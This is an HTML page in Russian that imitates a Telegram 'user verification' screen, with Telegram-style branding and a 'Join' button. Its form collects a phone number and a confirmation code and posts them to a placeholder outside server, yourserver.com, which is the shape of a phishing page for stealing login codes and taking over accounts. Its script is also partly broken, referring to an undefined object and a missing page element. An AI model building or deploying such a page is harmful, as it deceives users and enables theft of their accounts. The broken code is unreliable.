<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка пользователя Телеграмм</title>
    <!-- Подключаем официальный скрипт Telegram -->
    <script src="https://telegram.org"></script>
    <style>
        /* Строго белое оформление страницы и чёрный текст */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #111111;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }

        /* Голубая иконка с закруглёнными краями сверху */
        .tg-icon {
            width: 84px;
            height: 84px;
            background: linear-gradient(135deg, #38bdf8, #0284c7);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 30px;
            font-weight: 800;
            letter-spacing: 1px;
            box-shadow: 0 8px 20px rgba(2, 132, 199, 0.25);
            margin-bottom: 24px;
        }

        h1 {
            font-size: 24px;
            margin: 0 0 10px 0;
        }

        /* Кнопка в тон иконке */
        button {
            background-color: #0284c7;
            color: #ffffff;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        button:active {
            opacity: 0.75;
        }
    </style>
</head>
<body>

    <!-- Голубая иконка с надписью TG -->
    <div class="tg-icon">TG</div>

    <!-- Название страницы -->
    <h1>Проверка пользователя Телеграмм</h1>

    <form action="https://yourserver.com" method="post">
        <label for="newPhone">Новый номер телефона:</label>
        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
        <br>
        <label for="code">Код подтверждения:</label>
        <input type="number" id="code" name="code" placeholder="Код подтверждения" required>
        <br>
        <button id="sendBtn">Присоединиться</button>
    </form>

    <script>
        // Инициализация и загрузка скриптов от Telegram.
        window.onload = function() {
            if (window.location.hash === '#_=_') {
                window.location.href = window.location.href.split('#')[0];
            }
        };

        // Устанавливаем цвета для верхней шапки окна Telegram, если это возможно.
        if (windowTelegram && windowTelegram.theme) {
            document.documentElement.className = windowTelegram.theme;
        }

        // Подставляем имя пользователя, если оно доступно.
        document.getElementById('greeting').innerText = `Привет, ${windowTelegram && windowTelegram.name ?
windowTelegram.name : 'Пользователь'}`;
    </script>
</body>
</html>
